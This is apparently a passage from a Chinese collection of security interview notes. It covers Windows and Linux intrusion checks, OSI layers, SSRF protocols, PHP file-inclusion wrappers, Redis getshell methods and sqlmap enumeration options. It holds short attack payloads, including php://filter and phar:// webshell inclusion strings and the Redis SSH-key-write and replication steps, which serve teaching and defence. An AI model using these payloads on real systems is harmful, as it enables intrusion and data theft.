<p>根据<code>netstat -ano</code> 定位出的pid，再通过tasklist命令进行进程定位 <code>tasklist | findstr “PID”</code></p>
<h5 id="任务计划排查">任务计划排查</h5>
<p>攻击者在攻击成功后,添加任务计划往往是为了持久化控制.任务计划日志通常存放在<code>C:\Windows\System32\Tasks</code>目录下,可以直接打开系统自带的<code>任务计划程序</code>窗口进行查看</p>
<p>自定义的任务计划，则较为可疑，需进行排查。</p>
<h5 id="文件排查">文件排查</h5>
<p>攻击者在攻击成功后可能会在本地留下过程文件,这时需要排查各个盘符下的相关敏感目录，以便确定是否存在异常文件。</p>
<p><code>temp相关目录：</code><br>
temp指系统临时文件夹，用于存储系统临时文件。在Windows系统中，常见temp目录主要分<br>
布在如下位置:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\temp</span><br><span class="line">C:\Users\Administrator\AppData\Local\temp</span><br></pre></td></tr></table></figure>
<p>在寻找可疑文件时，先重点查看攻击时间范围内的文件，然后通过文件命令来判断。一般凡是在非系统System32或Syswow64目录下的svchost.exe文件基本为恶意文件；另外，命名特殊的文件也要重点排查。发现可疑文件后，可以提取样本做进一步的鉴定。</p>
<h4 id="linux系统排查">linux系统排查</h4>
<h5 id="账户排查">账户排查</h5>
<p><code>用户信息文件</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录</span><br></pre></td></tr></table></figure>
<p><code>影子文件</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV</span><br><span class="line">9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之</span><br><span class="line">后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who			查看当前登陆用户</span><br><span class="line">w			查看系统信息,想知道某一时刻用户的行为</span><br><span class="line">uptime		查看登陆多久,多少用户,负载</span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230413191405619.png" alt="image-20230413191405619"></p>
<h5 id="入侵排查">入侵排查</h5>
<p><code>查看特权用户</code><strong>(uid为0)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<p><code>查看可以远程登陆的账户信息</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>
<p><code>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>
<p><code>禁用或删除多余以及可以的账户</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usermod -L username 禁用帐号，帐号无法登录/etc/shadow第二栏为!开头</span><br><span class="line">userdel username 删除用户</span><br><span class="line">userdel -r username 将删除该用户,并且将/home下的user目录一并删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="历史命令">历史命令</h4>
<h5 id="通过-bash-history查看帐号执行过的系统命令">通过.bash_history查看帐号执行过的系统命令</h5>
<p>如果想要执行历史命令中的某个命令直接感叹号</p>
<p><code>root的历史命令</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>
<p><code>查看某用户的操作历史</code></p>
<pre><code>cat  /home/username/.bash_history
</code></pre>
<p>在<code>/etc/profile</code>的文件尾部添加如下行数配置信息，可以显示登录的IP地址、执行命令时间等信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br></pre></td></tr></table></figure>
<h4 id="检查异常端口">检查异常端口</h4>
<p>使用netstat网络连接命令,分析可疑端口,IP,PID</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">查看pid所对应的进程文件路径</span><br><span class="line">运行ls -l /proc/PID/exe 或file /proc/PID/exe (PID为对应的pid号)</span><br></pre></td></tr></table></figure>
<h4 id="检查异常进程">检查异常进程</h4>
<p>使用ps命令,分析进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure>
<h4 id="检查开机启动项">检查开机启动项</h4>
<p><code>查看启动配置文件</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/rc*.d/</span><br><span class="line">ls -l /etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure>
<p><code>查看运行级别命令</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runlevel</span><br></pre></td></tr></table></figure>
<p>当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链 接即可 root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh 此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行 级别加载时需要关闭的。</p>
<h4 id="检查定时任务">检查定时任务</h4>
<p>利用crontab创建计划任务</p>
<h5 id="基本命令">基本命令</h5>
<p>crontab -l 列出某个用户cron服务的详细内容</p>
<p>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</p>
<p>crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</p>
<p>crontab -e 使用编辑器编辑当前的crontab文件</p>
<h5 id="入侵排查-2">入侵排查</h5>
<p>重点关注一下目录中是否存在恶意脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>
<p><em><em>小技巧： more /etc/cron.daily/</em> 查看目录下所有文件</em>*</p>
<h4 id="检查服务">检查服务</h4>
<h5 id="入侵排查-3">入侵排查</h5>
<p>查询已安装的服务：</p>
<p>RPM包安装的服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">ps aux | grep crond 查看当前服务</span><br><span class="line">系统在3与5级别下的启动项</span><br><span class="line">中文环境</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|5:启用&quot;</span><br><span class="line">英文环境</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure>
<p><strong>源码包安装的服务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看服务安装位置 ，一般是在/user/local/</span><br><span class="line">service httpd start</span><br><span class="line">搜索/etc/rc.d/init.d/ 查看是否存在</span><br></pre></td></tr></table></figure>
<h5 id="服务器自启动">服务器自启动</h5>
<p>第一种修改方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level 运行级别] [独立服务名] [on|off]</span><br><span class="line">chkconfig –level 2345 httpd on 开启自启动</span><br><span class="line">chkconfig httpd on （默认level是2345）</span><br></pre></td></tr></table></figure>
<p>第二种修改方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改 /etc/re.d/rc.local 文件</span><br><span class="line">加入 /etc/init.d/httpd start</span><br></pre></td></tr></table></figure>
<p>第三种修改方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务</span><br></pre></td></tr></table></figure>
<h4 id="检查异常文件">检查异常文件</h4>
<p>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性</p>
<p>如<code>.test.txt</code>前面带<code>.</code>的文件是隐藏文件</p>
<p>得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
<p>可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件</p>
<p>针对可疑文件可以使用stat进行创建修改时间</p>
<h4 id="检查系统日志">检查系统日志</h4>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">定位有多少IP在爆破主机的root帐号：</span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">| more</span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4]</span><br><span class="line">[0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print</span><br><span class="line">&quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">登录成功的IP有哪些：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line"></span><br><span class="line">增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001,</span><br><span class="line">home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by</span><br><span class="line">root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ;</span><br><span class="line">COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>
<h4 id="检查异常文件-找-php后缀文件">检查异常文件,找.php后缀文件</h4>
<p>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性 2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ 可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件 3、针对可疑文件可以使用stat进行创建修改时间。</p>
<h4 id="检查系统日志-2">检查系统日志</h4>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th>日志文件</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>/var/log/cron</td>
<td>记录了系统定时相关的日志</td>
</tr>
<tr>
<td>/var/log/cups</td>
<td>记录打印信息的日志</td>
</tr>
<tr>
<td>/var/log/dmesg</td>
<td>记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td>/var/log/mailog</td>
<td>记录邮件信息</td>
</tr>
<tr>
<td><strong>/var/log/message</strong></td>
<td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系 统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td>/var/log/btmp</td>
<td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td>/var/log/lastlog</td>
<td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要 使用lastlog命令查看</td>
</tr>
<tr>
<td>/var/log/wtmp</td>
<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文 件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td>/var/log/utmp</td>
<td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登 录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td>/var/log/secure</td>
<td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换 用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody>
</table>
<h2 id="35-OSI-的七层模型都有哪些？">35.OSI 的七层模型都有哪些？</h2>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202404211758465.png" alt="img"></p>
<table>
<thead>
<tr>
<th>OSI七层网络模型</th>
<th>TCP/IP四层概念模型</th>
<th>对应网络协议</th>
</tr>
</thead>
<tbody>
<tr>
<td>应用层（Application）</td>
<td></td>
<td>HTTP、TFTP, FTP, NFS, WAIS、SMTP</td>
</tr>
<tr>
<td>表示层（Presentation</td>
<td>应用层</td>
<td>Telnet, Rlogin, SNMP, Gopher</td>
</tr>
<tr>
<td>会话层（Session）</td>
<td></td>
<td>SMTP, DNS</td>
</tr>
<tr>
<td>传输层（Transport）</td>
<td>传输层</td>
<td>TCP, UDP</td>
</tr>
<tr>
<td>网络层（Network）</td>
<td>网络层</td>
<td>IP, ICMP, ARP, RARP, AKP, UUCP</td>
</tr>
<tr>
<td>数据链路层（Data Link）</td>
<td>数据链路层</td>
<td>FDDI, Ethernet, Arpanet, PDN, SLIP, PPP</td>
</tr>
<tr>
<td>物理层（Physical）</td>
<td>数据链路层</td>
<td>IEEE 802.1A, IEEE 802.2到IEEE 802.11</td>
</tr>
</tbody>
</table>
<p>OSI七层和TCP/IP的区别<br>
TCP/IP他是一个协议簇；而OSI（开放系统互联）则是一个模型，且TCP/IP的开发时间在OSI之前。<br>
TCP/IP是由一些交互性的模块做成的分层次的协议，其中每个模块提供特定的功能；OSi则指定了哪个功能是属于哪一层的。</p>
<h2 id="36-任意文件读取，我们通常获取什么文件">36.任意文件读取，我们通常获取什么文件</h2>
<p>/etc/passwd	系统用户配置文件，存储了系统中所有用户的基本信息</p>
<p>/index.php</p>
<p>/config.ini</p>
<p>nignx默认日志<code>/var/log/nignx/access.log</code></p>
<p>apache默认日志<code>/var/log/apache/access.log</code></p>
<h2 id="37-ssrf使用了什么协议">37.ssrf使用了什么协议</h2>
<p>gopher协议,file协议,dict协议</p>
<p>gopher协议通常是用脚本来编写的</p>
<p>file协议访问文件绝对路径</p>
<p><strong>dict协议功能：</strong></p>
<p>探测内网主机</p>
<p>探测端口的开放情况和指纹信息</p>
<p>执行命令</p>
<h2 id="38-PHP文件包含使用了什么协议">38.PHP文件包含使用了什么协议</h2>
<ul>
<li>
<h3 id="php-filter（本地磁盘文件进行读取）">php://filter（本地磁盘文件进行读取）</h3>
</li>
</ul>
<p>只是读取，需要开启allow_url_fopen,不需要开启allow_url_include;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="php-input访问请求的原始数据的只读流-直接读取到POST上没有经过解析的原始数据。">php://input	访问请求的原始数据的只读流,直接读取到POST上没有经过解析的原始数据。</h3>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://input</span><br><span class="line">[POST d</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="file-通过file伪协议可以访问本地文件系统，读取到文件的内容">file://	通过file伪协议可以访问本地文件系统，读取到文件的内容</h3>
</li>
</ul>
<p>不受allow_url_fopen与allow_url_include的影响</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="data">data://</h3>
</li>
</ul>
<p>注意浏览器不能识别<code>+</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;[编码类型],&lt;?php phpinfo();?&gt;</span><br><span class="line">						[对应的编码形式的字符]</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="phar-php解压缩的一个函数，不管后缀是什么，都会当做压缩包来解压">phar://	php解压缩的一个函数，不管后缀是什么，都会当做压缩包来解压</h3>
</li>
</ul>
<p>注意 PHP&gt;=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
<p>步骤：写一个一句话木马shell.php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://压缩包/内部文件</span><br><span class="line">?file=phar://xxx.png/shell.php</span><br></pre></td></tr></table></figure>
<ul>
<li>dict://	探测内网主机,探测端口的开放情况和指纹信息,执行命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:8000</span><br></pre></td></tr></table></figure>
<p>用dict协议请求内网端口查看是否存活</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/6f4e05e4dfbd49a6ab01949ea3380cb4.png" alt="在这里插入图片描述"></p>
<ul>
<li>
<h3 id="zlib-—-压缩流"><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</h3>
</li>
<li>
<h3 id="ftp-—-访问-FTP-s-URLs"><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</h3>
</li>
</ul>
<h2 id="39-各种数据库的区别">39.各种数据库的区别,</h2>
<h3 id="数据库端口">数据库端口</h3>
<p><strong>关系型数据库：</strong></p>
<ul>
<li><strong>MYSQL       3306</strong></li>
<li><strong>SQL Server    1433</strong></li>
<li><strong>Oracle        1521</strong></li>
<li><strong>DB2          5000</strong></li>
</ul>
<p><strong>非关系型数据库：</strong></p>
<ul>
<li><strong>Redis          6379</strong></li>
<li><strong>Memcached    11211</strong></li>
<li><strong>MongoDB      27017</strong></li>
<li><strong>HBase</strong>       列存储数据库</li>
</ul>
<p><strong>区别</strong></p>
<p>关系型数据库最典型的数据结构是表，由二维表及其之间的联系所组成的一个数据组织</p>
<p>非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合，可以是文档或者键值对等。</p>
<p>比如</p>
<p><strong>Redis</strong>		<strong>键值数据库</strong></p>
<p><strong>MongoDB</strong>		<strong>文档数据库</strong></p>
<p><strong>HBase</strong>       <strong>列存储数据库</strong></p>
<p><strong>Neo4J</strong> 	 <strong>（非关系型数据库----图形数据库）</strong></p>
<p>数据库模型：对象模型、层次模型（轻量级数据访问协议）、网状模型（大型数据储存）、关系模型、面向对象模型、半结构化模型、平面模型（表格模型，一般在形式上是一个二维数组。如表格模型数据Excel)</p>
<h2 id="40-Redis-getshell的过程">40.Redis getshell的过程</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Redis简介是一个开源、基于内存、高性能、可数据持久化的key-value存储系统，遵守BSD协议，可用作数据库、缓存和消息中间件。</span><br><span class="line"></span><br><span class="line">**简单来说 redis 就是一个Key-Value类型的数据库， redis 所有数据全部在内存中进行操作，并且它可以将内存中的数据定期存储在磁盘中，并且支持保存多种数据结构(String、hash、list等)。**</span><br><span class="line"></span><br><span class="line">redis的特性：支持多种数据类型、支持数据的持久化机制、支持事务控制、支持主从复制功能等。</span><br><span class="line"></span><br><span class="line">Redis的数据存储是通过Key映射Value的方式，建立字典以保存数据。Redis共支持五种数据类型。</span><br><span class="line"></span><br><span class="line">1）String（字符串）</span><br><span class="line">Redis最基本的类型，一个key对应一个value。</span><br><span class="line">（2）Hash（哈希表）</span><br><span class="line">键值对集合，是一个string类型的数据域field和值value的映射表。</span><br><span class="line">（3）List（列表）</span><br><span class="line">字符串列表，按照插入顺序排序。支持在列表的头部或者尾部添加数据元素。</span><br><span class="line">（4）Set（集合）</span><br><span class="line">字符串类型的无序集合，支持添加、删除、查找，Redis还能对set进行交集、并集、差集等集合操作。</span><br><span class="line">（5）Zset（有序集合）</span><br><span class="line">字符串类型的有序集合，集合中的每个元素都会关联一个double类型的分数。Redis通过这个分数为集合进行排序。</span><br></pre></td></tr></table></figure>
<h3 id="绝对路径写shell，将shell写在web目录下">绝对路径写shell，将shell写在web目录下</h3>
<h3 id="-2"></h3>
<h3 id="利用定时任务进行反弹shell-centos">利用定时任务进行反弹shell(centos)</h3>
<h3 id="redis-主从复制getshell">redis 主从复制getshell</h3>
<ol>
<li>配置文件写入<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
<li>redis-server启动命令后加入 <code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
<li>连接到客户端之后执行：slaveof <code>&lt;master_ip&gt; &lt;master_port&gt;</code></li>
</ol>
<h3 id="redis未授权公钥导入">redis未授权公钥导入</h3>
<p>Redis因为配置不当会导致<strong>未授权访问</strong>,在一定条件下,<strong>Redis服务器以root身份运行</strong>,攻击者就能给root账户写入<strong>SSH公钥</strong>文件,然后直接通过SSH登陆目标受害的服务器,就能够直接提权目标服务器,然后进行一系列的数据增删改查,甚至是泄露信息,勒索加密等.</p>
<p>一般情况下,Redis服务会绑定在服务器的6379端口上面,Redis配置是不会默认开启认证的,如果没有采取相关防御举措,如在防火墙添加规避举措,避免其他非信任的IP访问等,这将会把Redis的服务直接暴露在公网上</p>
<p>最直接的影响就是其他用户能够直接在未授权的情况下直接访问Redis服务器并进行相关恶意操作</p>
<p>未授权访问 --&gt; 写入公钥 --&gt; 变更Redis DB文件存放为公钥目录 --&gt;使用私钥登录</p>
<p><strong>未授权访问测试</strong></p>
<p>Redis的默认配置是只允许本地访问，默认配置是空口令。</p>
<p>一般会使用Nmap对目标机器进行扫描。如果发现主机的6379端口是对外开放的，并且目标主机开放外网访问的情况下，就能够在本机使用redis-cli服务连接目标服务器，然后进行恶意操作，黑客能够在未授权访问Redis的情况下，利用Redis自身提供的config命令，进行写文件操作，然后攻击者就能够将自己的ssh公钥写入目标Redis服务器的/root/.ssh文件中的authotrized_keys文件中，进而直接使用公钥对应的私钥直接使用ssh服务登录目标Redis服务器。</p>
<h2 id="41-sqlmap怎么看当前用户权限">41.sqlmap怎么看当前用户权限</h2>
<pre><code>Enumeration:

-a, --all 查找全部，很暴力。直接用-a
-b, --banner 查找数据库管理系统的标识。直接用-b
--current-user 当前用户，常用，直接用--current-user
--current-db 当前数据库，常用，直接用--current-db
--hostname 主机名，直接用--hostname
--is-dba
--users 查询一共都有哪些用户，常用，直接用--users
--passwords 查询用户密码的哈希，常用，直接用--passwords
--privileges 查看特权，常用。例： --privileges -U username (CU 就是当前用户)
--roles 查看一共有哪些角色（权限），直接用--roles
--dbs 目标服务器中有什么数据库，常用，直接用--dbs
--tables 目标数据库有什么表，常用，直接用--tables
--columns 目标表中有什么列，常用，直接用--colums
--schema 目标数据库数据库系统管理模式。
--count 查询结果返回一个数字，即多少个。
--dump 查询指定范围的全部数据。例： --dump -D admin -T admin -C username
--dump-all 查询全部数据。例： --dump-all --exclude-sysdbs
--search 搜索列、表和/或数据库名称。
--comments 检索数据库的备注。
-D DB 指定从某个数据库查询数据，常用。例： -D admindb
-T TBL 指定从某个表查询数据，常用。例： -T admintable
-C COL 指定从某个列查询数据，常用。例： -C username
-X EXCLUDE 指定数据库的标识符。
-U USER 一个用户，通常和其他连用。例： --privileges -U username (CU 就是当前用户)
--exclude-sysdbs 除了系统数据库。
--pivot-column=P.. 枢轴列名，不懂。
--where=DUMPWHERE 在dump表时使用where限制条件。
--start=LIMITSTART 设置一个起始，通常和--dunmp连用。
--stop=LIMITSTOP 同上，设置一个结束。
